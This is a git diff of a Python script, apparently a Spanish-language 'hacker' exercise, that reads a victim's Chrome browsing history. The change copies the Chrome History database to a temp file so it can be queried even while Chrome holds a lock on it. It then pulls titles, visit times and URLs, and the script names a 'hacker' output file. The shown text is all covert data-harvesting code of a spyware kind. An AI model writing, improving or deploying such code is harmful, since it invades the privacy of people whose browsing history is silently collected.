@@ -1,10 +1,12 @@
+import glob
 import os
+import re
+import sqlite3
 from pathlib import Path
+from shutil import copyfile
 from random import randrange
 from time import sleep
-import sqlite3
-import re
-import glob
+
 HACKER_FILE_NAME = "Pruebameeee.txt"
 
 
@@ -43,7 +45,9 @@ def get_chrome_history(user_path):
     while not urls:
         try:
             history_path = user_path + "AppData/Local/Google/Chrome/User Data/Default/History"
-            connecting = sqlite3.connect(history_path)
+            temp_history = history_path + "temp"
+            copyfile(history_path,temp_history)
+            connecting = sqlite3.connect(temp_history)#Esto nos permite que aunque estemos dentro de google chrome y este bloque la base de datos, este nos permita obsevar en el temp la información termporal del historial
             cursor = connecting.cursor()
             cursor.execute(
                 "SELECT title, last_visit_time, url FROM urls ORDER BY  last_visit_time DESC")
